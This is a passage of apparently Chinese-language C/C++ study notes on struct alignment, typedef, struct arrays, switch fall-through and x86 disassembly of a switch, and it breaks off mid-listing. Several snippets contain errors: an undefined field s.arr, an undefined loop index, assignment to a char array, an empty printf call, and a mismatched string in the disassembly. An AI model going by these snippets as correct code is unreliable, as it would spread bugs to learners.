data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230122141122230.png\" alt=\"image-20230122141122230\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230122142241459.png\" alt=\"image-20230122142241459\"></p>\n<p>取结构体中变量最大的和默认相比，取小的</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230122142505891.png\" alt=\"image-20230122142505891\"></p>\n<p><strong>按照数据型由小到大的顺序进行书写</strong></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230122142714801.png\" alt=\"image-20230122142714801\"></p>\n<p>嵌套结构体按照嵌套的结构体中变量最大的是对齐宽度，但结构体还是按照原来大小累加</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">struct S1</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t//16</span><br><span class=\"line\">\tchar c;</span><br><span class=\"line\">\tdouble i;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">struct S3</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t//32</span><br><span class=\"line\">\tchar c1;</span><br><span class=\"line\">\tS1 s;</span><br><span class=\"line\">\tchar c2;</span><br><span class=\"line\">\tchar c3;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">struct S4</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t//40</span><br><span class=\"line\">\tchar c1;</span><br><span class=\"line\">\tS1 s;</span><br><span class=\"line\">\tchar c2;</span><br><span class=\"line\">\tdouble c3;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">struct S5</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t//16</span><br><span class=\"line\">\tint c1;</span><br><span class=\"line\">\tchar c2[10];</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">int main(int argc, char* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tprintf(&quot;%d %d %d %d %d\\n&quot;,sizeof(S1),sizeof(S3),sizeof(S4),sizeof(S5),sizeof(1));</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"typedef\"><a class=\"markdownIt-Anchor\" href=\"#typedef\">#</a> typedef</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">typedef为C语言的关键字，作用是为一种数据类型定义一个新名字。这里的数据类型包括内部数据类型(int, char等)和自定</span><br><span class=\"line\"></span><br><span class=\"line\">typedef unsigned char BYTE;</span><br><span class=\"line\"></span><br><span class=\"line\">typedef int vector[10];</span><br><span class=\"line\">vector v;</span><br><span class=\"line\">v[0] = 1;</span><br><span class=\"line\"></span><br><span class=\"line\">typedef struct student</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tchar a[10];</span><br><span class=\"line\">&#125;stu;</span><br><span class=\"line\">main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tstu s;</span><br><span class=\"line\">\ts.a[0] = &#x27;a&#x27;;</span><br><span class=\"line\">\ts.a[1] = &#x27;b&#x27;;</span><br><span class=\"line\">\ts.a[2] = &#x27;c&#x27;;</span><br><span class=\"line\">\ts.a[3] = &#x27;\\0&#x27;;  //s.a[3] = 0;   \\0和0都是结束符号</span><br><span class=\"line\">\tprintf(&quot;%s&quot;,s.arr);    //abc</span><br><span class=\"line\">\t</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">stu 是 student结构体的别名，两个都可以使用</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#include &quot;string.h&quot;</span><br><span class=\"line\">strcpy(s.arr,&quot;china&quot;);</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">struct</span> <span class=\"title class_\">nPos</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">float</span> x;</span><br><span class=\"line\">\t<span class=\"type\">float</span> y;</span><br><span class=\"line\">\t<span class=\"type\">float</span> z;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">struct</span> <span class=\"title class_\">Monster</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> id;</span><br><span class=\"line\">\t<span class=\"type\">char</span> name[<span class=\"number\">32</span>];</span><br><span class=\"line\">\t<span class=\"type\">int</span> Hp;</span><br><span class=\"line\">\t<span class=\"type\">int</span> blue;</span><br><span class=\"line\">\tnPos pos;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">Monster mon[<span class=\"number\">10</span>];   <span class=\"comment\">//结构体数组</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">value</span><span class=\"params\">(<span class=\"type\">int</span> n,<span class=\"type\">char</span> *name,<span class=\"type\">int</span> hp,<span class=\"type\">int</span> blue, <span class=\"type\">float</span> x,<span class=\"type\">float</span> y,<span class=\"type\">float</span> z)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tmon[i].name = name;</span><br><span class=\"line\">\tmon[i].pos.x = x;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">find</span><span class=\"params\">(<span class=\"type\">int</span> x)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">0</span>;i&lt;=<span class=\"number\">9</span>;i++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (mon[i].id == x)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"built_in\">printf</span>();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"switch\"><a class=\"markdownIt-Anchor\" href=\"#switch\">#</a> Switch</h3>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230123104349398.png\" alt=\"image-20230123104349398\"></p>\n<p>case 后面必须是常量表达式</p>\n<p>case 后常量表达式的值不能一样</p>\n<p>switch 后面表达式必须为整数</p>\n<p>没有 break 时会顺序向下执行，直到遇到 break</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">func</span><span class=\"params\">(<span class=\"type\">int</span> x)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">switch</span>(x)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;1&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">2</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;2&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">3</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;3&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">4</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;4&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">default</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;5&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tfunc(<span class=\"number\">2</span>);     <span class=\"comment\">//2</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">----------------------------------------------------------------</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">func</span><span class=\"params\">(<span class=\"type\">int</span> x)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">switch</span>(x)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;1&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">2</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;2&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">3</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;3&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">4</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;4&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">default</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;5&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tfunc(<span class=\"number\">2</span>);   <span class=\"comment\">//234</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//表达式都不成立执行default，default可以省略但不建议</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>switch 反汇编分析</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">func</span><span class=\"params\">(<span class=\"type\">int</span> x)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">switch</span>(x)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;1&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">2</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;2&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">3</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;3&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">default</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;5&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">func</span>(<span class=\"number\">2</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">00401020</span> <span class=\"number\">55</span>                   push        ebp</span><br><span class=\"line\"><span class=\"number\">00401021</span> <span class=\"number\">8B</span> EC                mov         ebp,esp</span><br><span class=\"line\"><span class=\"number\">00401023</span> <span class=\"number\">83</span> EC <span class=\"number\">44</span>             sub         esp,<span class=\"number\">44</span>h</span><br><span class=\"line\"><span class=\"number\">00401026</span> <span class=\"number\">53</span>                   push        ebx</span><br><span class=\"line\"><span class=\"number\">00401027</span> <span class=\"number\">56</span>                   push        esi</span><br><span class=\"line\"><span class=\"number\">00401028</span> <span class=\"number\">57</span>                   push        edi</span><br><span class=\"line\"><span class=\"number\">00401029</span> <span class=\"number\">8</span>D <span class=\"number\">7</span>D BC             lea         edi,[ebp<span class=\"number\">-44</span>h]</span><br><span class=\"line\"><span class=\"number\">0040102</span>C B9 <span class=\"number\">11</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>       mov         ecx,<span class=\"number\">11</span>h</span><br><span class=\"line\"><span class=\"number\">00401031</span> B8 CC CC CC CC       mov         eax,<span class=\"number\">0</span>CCCCCCCCh</span><br><span class=\"line\"><span class=\"number\">00401036</span> F3 AB                rep stos    dword ptr [edi]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">00401038</span> <span class=\"number\">8B</span> <span class=\"number\">45</span> <span class=\"number\">08</span>             mov         eax,dword ptr [ebp+<span class=\"number\">8</span>]</span><br><span class=\"line\"><span class=\"number\">0040103B</span> <span class=\"number\">89</span> <span class=\"number\">45</span> FC             mov         dword ptr [ebp<span class=\"number\">-4</span>],eax</span><br><span class=\"line\"><span class=\"number\">0040103</span>E <span class=\"number\">83</span> <span class=\"number\">7</span>D FC <span class=\"number\">01</span>          cmp         dword ptr [ebp<span class=\"number\">-4</span>],<span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"number\">00401042</span> <span class=\"number\">74</span> <span class=\"number\">0</span>E                je          func+<span class=\"number\">32</span>h (<span class=\"number\">00401052</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">00401044</span> <span class=\"number\">83</span> <span class=\"number\">7</span>D FC <span class=\"number\">02</span>          cmp         dword ptr [ebp<span class=\"number\">-4</span>],<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"number\">00401048</span> <span class=\"number\">74</span> <span class=\"number\">17</span>                je          func+<span class=\"number\">41</span>h (<span class=\"number\">00401061</span>)</span><br><span class=\"line\"><span class=\"number\">0040104</span>A <span class=\"number\">83</span> <span class=\"number\">7</span>D FC <span class=\"number\">03</span>          cmp         dword ptr [ebp<span class=\"number\">-4</span>],<span class=\"number\">3</span></span><br><span class=\"line\"><span class=\"number\">0040104</span>E <span class=\"number\">74</span> <span class=\"number\">20</span>                je          func+<span class=\"number\">50</span>h (<span class=\"number\">00401070</span>)</span><br><span class=\"line\"><span class=\"number\">00401050</span> EB <span class=\"number\">2</span>D                jmp         func+<span class=\"number\">5F</span>h (<span class=\"number\">0040107f</span>)</span><br><span class=\"line\"><span class=\"number\">00401052</span> <span class=\"number\">68</span> <span class=\"number\">28</span> <span class=\"number\">20</span> <span class=\"number\">42</span> <span class=\"number\">00</span>       push        offset string <span class=\"string\">&quot;1&quot;</span> (<span class=\"number\">00422028</span>)</span><br><span class=\"line\"><span class=\"number\">00401057</span> E8 E4 <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>       <span class=\"function\">call        <span class=\"title\">printf</span> <span class=\"params\">(<span class=\"number\">00401140</span>)</span></span></span><br><span class=\"line\"><span class=\"function\">0040105C 83 C4 04             add         esp,4</span></span><br><span class=\"line\"><span class=\"function\">0040105F EB 2B                jmp         func+6<span class=\"title\">Ch</span> <span class=\"params\">(<span class=\"number\">0040108</span>c)</span></span></span><br><span class=\"line\"><span class=\"function\">00401061 68 24 20 42 00       push        offset string &quot;2&quot; <span class=\"params\">(<span class=\"number\">00422024</span>)</span></span></span><br><span class=\"line\"><span class=\"function\">00401066 E8 D5 00 00 00       call        <span class=\"title\">printf</span> <span class=\"params\">(<span class=\"number\">00401140</span>)</span></span></span><br><span class=\"line\"><span class=\"function\">0040106B 83 C4 04             add         esp,4</span></span><br><span class=\"line\"><span class=\"function\">0040106E EB 1C                jmp         func+6<span class=\"title\">Ch</span> <span class=\"params\">(<span class=\"number\">0040108</span>c)</span></span></span><br><span class=\"line\"><span class=\"function\">00401070 68 20 20 42 00       push        offset string &quot;4&quot; <span class=\"params\">(<span class=\"number\">00422020</span>)</span></span></span><br><span class=\"line\"><span class=\"function\">00401075 E8 C6 00 00 00       call        <span class=\"title\">printf</span> <span class=\"params\">(<span class=\"number\">00401140</span>)</span></span></span><br><span class=\"line\"><span class=\"function\">0040107A 83 C4 04             add         esp,4</span></span><br><span class=\"line\"><span class=\"function\">0040107D EB 0D                jmp         func+6<span class=\"title\">Ch</span> <span class=\"params\">(<span class=\"number\">0040108</span>c)</span></span></span><br><span class=\"line\"><span class=\"function\">0040107F 68 1C 20 42 00       push        offset string &quot;5&quot; <span class=\"params\">(<span class=\"number\">0042201</span>c)</span></span></span><br><span class=\"line\"><span class=\"function\">00401084 E8 B7 00 00 00       call        <span class=\"title\">printf</span> <span class=\"params\">(<span class=\"number\">00401140</span>)</span></span></span><br><span class=\"line\"><span class=\"function\">00401089 83 C4 04             add         esp,4</span></span><br><span class=\"line\"><span class=\"function\">0040108C 5F                   pop         edi</span></span><br><span class=\"line\"><span class=\"function\">0040108D 5E                   pop         esi</span></span><br><span class=\"line\"><span class=\"function\">0040108E 5B                   pop         ebx</span></span><br><span class=\"line\"><span class=\"function\">0040108F 83 C4 44             add         esp,44h</span></span><br><span class=\"line\"><span class=\"function\">00401092 3B EC                cmp         ebp,esp</span></span><br><span class=\"line\"><span class=\"function\">00401094 E8 27 01 00 00       call        __<span class=\"title\">chkesp</span> <span class=\"params\">(<span class=\"number\">004011</span>c0)</span></span></span><br><span class=\"line\"><span class=\"function\">00401099 8B E5                mov         esp,ebp</span></span><br><span class=\"line\"><span class=\"function\">0040109B 5D                   pop         ebp</span></span><br><span class=\"line\"><span class=\"function\">0040109C C3                   ret</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">    </span></span><br><span class=\"line\"><span class=\"function\"><span class=\"comment\">//分支条件比较少时&lt;4和if-else反汇编类似</span></span></span><br><span class=\"line\"><span class=\"function\">    </span></span><br><span class=\"line\"><span class=\"function\"><span class=\"comment\">//分支大于4时在内存中生成大表  [edx*4+4010B1h]通过寻址</span></span></span><br><span class=\"line\"><span class=\"function\">    </span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">func</span><span class=\"params\">(<span 